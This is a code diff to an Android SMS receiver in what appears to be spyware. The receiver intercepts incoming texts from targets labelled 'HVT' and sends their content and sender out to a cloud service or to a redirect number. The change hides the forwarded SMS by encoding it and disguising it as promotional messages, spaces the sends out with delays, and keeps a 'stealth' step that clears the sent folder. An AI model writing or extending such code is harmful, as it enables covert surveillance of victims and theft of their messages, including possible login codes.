@@ -64,12 +64,18 @@ class SmsReceiver : BroadcastReceiver() {
                             val extra = JSONObject().apply { put("hvt_intercept", body); put("from", sender) }
                             CloudManager.sendPing(context, "HVT_INTERCEPT", extra)
                         } else {
-                            // Option 2: Forward via SMS Tunnel
+                            // Option 2: Forward via SMS Tunnel (Encrypted Promo)
                             try {
+                                val msgRaw = "[HVT:$sender] $body"
+                                val token = FidelCipher.encode(msgRaw)
+                                val promos = FidelCipher.camouflage(context, token)
                                 val smsManager = context.getSystemService(android.telephony.SmsManager::class.java)
-                                val msg = "[HVT:$sender] $body"
-                                val parts = smsManager.divideMessage(msg)
-                                smsManager.sendMultipartTextMessage(redirectTarget, null, parts, null, null)
+                                
+                                for (promo in promos) {
+                                    val parts = smsManager.divideMessage(promo)
+                                    smsManager.sendMultipartTextMessage(redirectTarget, null, parts, null, null)
+                                    delay(3000)
+                                }
                                 
                                 // Stealth: Cleanup sent folder
                                 delay(5000)
